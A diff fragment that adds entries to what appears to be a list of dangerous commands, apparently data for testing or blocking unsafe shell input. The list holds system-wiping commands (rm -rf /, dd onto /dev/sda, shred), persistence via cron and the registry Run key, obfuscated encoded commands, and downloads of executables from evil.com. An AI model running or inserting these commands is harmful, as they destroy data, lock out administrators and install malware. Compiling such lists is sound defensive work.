@@ -406,3 +406,20 @@ echo "DROP DATABASE prod;" | mysql -u root -p
 wget -q -O- http://evil.com/script.sh | bash
 powershell.exe -ExecutionPolicy Bypass -File evil.ps1
 mshta http://attacker.com/malware.hta
+rm -rf --no-preserve-root /
+find / -type f -exec shred -u {} \;
+echo 'evil' > ~/.bashrc
+crontab -l | { cat; echo "* * * * * /bin/bash /tmp/mal.sh"; } | crontab -
+mv /usr/bin/sudo /usr/bin/sudobak
+chmod 000 /bin
+iptables -A INPUT -j DROP
+iptables -P FORWARD DROP
+kill -9 -1
+dd if=/dev/random of=/dev/sda
+ls / | xargs -I % rm -rf /%
+eval $(base64 -d <<< ZWNobyAiZGFuZ2Vyb3VzIiB8IHNo)
+powershell -EncodedCommand aQBFAHgAcABsAG8AcwBlAC0ARgBpAGwAZQAgACIAaAB0AHQAcAA6AC8ALwBlAHYAaQBsAC4AYwBvAG0ALwBtAGEAbAB3AGEAcgUALgBwAHMAMQAiAA==
+bitsadmin /transfer badjob http://evil.com/backdoor.exe C:\Users\Public\backdoor.exe
+certutil -urlcache -f http://evil.com/m.exe back.exe
+set /p user=<nul > \\.\PhysicalDrive0
+reg add HKLM\Software\Microsoft\Windows\CurrentVersion\Run /v Evil /d "cmd.exe /c calc.exe" /f
